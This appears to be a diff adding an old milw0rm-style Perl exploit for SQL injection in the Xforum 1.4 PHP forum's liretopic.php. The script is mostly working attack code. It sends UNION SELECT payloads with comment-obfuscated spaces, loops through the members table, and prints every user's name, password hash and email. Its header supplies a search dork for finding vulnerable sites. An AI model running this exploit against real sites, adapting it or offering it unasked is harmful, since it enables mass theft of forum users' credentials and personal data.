@@ -1,0 +1,64 @@
+#!/usr/bin/perl
+#######################################################
+#
+# Xforum 1.4 Remote SQL Injection
+# desc: Un forum php/MySQL, avec gestion complete des membres et des messages
+# download: http://www.comscripts.com/scripts/php.xforum.1188.html
+# d0rk: "xforum 1.4"
+# bug found by j0j0
+# c0ded by j0j0
+#
+# liretopic.php
+# 68.       $conn = connect();
+# 69.       $requete = "SELECT titre,closed,place,cara FROM topic WHERE numero=".$_GET['topic']." AND categorie=".$_GET['categorie'];
+# 70.       $res = mysql_query($requete) or    die(mysql_error());
+# 71.       $proptopic = mysql_fetch_row($res);
+#
+#######################################################
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+$lwp = new LWP::UserAgent;
+
+$host = $ARGV[0];
+
+print q{
+----------------------------------------------
+      .: Xforum 1.4 Remote SQL Injection :.
+----------------------------------------------
+  c0ded by: j0j0
+  download: http://www.comscripts.com/scripts/php.xforum.1188.html
+  desc: Un forum php/MySQL, avec gestion complete des membres et des messages
+  d0rk: "xforum 1.4"
+----------------------------------------------
+};
+ 
+if(!$ARGV[0]) {
+    print "[*] Usage: perl $0 [HOST]\n";
+    print "[*] Example: perl $0 http://mysite.com/forum\n";
+    exit(1);
+}
+ 
+print "\n[*] Connecting to $host...\n";
+$i=0;
+while(true) {
+    $go=$lwp->get($host."/liretopic.php?categorie=1&topic=-1/**/UNION/**/SELECT/**/CONCAT(0x21232321,pseudo,char(58),pass,char(58),mail,0x21232321),1,2,3/**/FROM/**/inscrit/**/LIMIT/**/$i,100000/**//*&nbpage=1&nbpageliste=1");
+    if($go->content =~ m/!##!(.*?)!##!/ms) {
+        @res = split(/:/, $1);
+        $res[1] = substr($res[1], 0, 32);
+        print "\n[+] Username : $res[0]\n";
+        print "[+] Password : $res[1]\n";
+        if($res[2] =~ /(.*?)@(.*?)/) {
+            print "[+] Mail : $res[2]\n";
+        }
+        $i++;
+    }
+    else {
+        if($i == 0) {
+            print "[-] Exploit failed\n";
+        }
+        exit(1);
+    }
+}
+
+# milw0rm.com [2008-01-14]
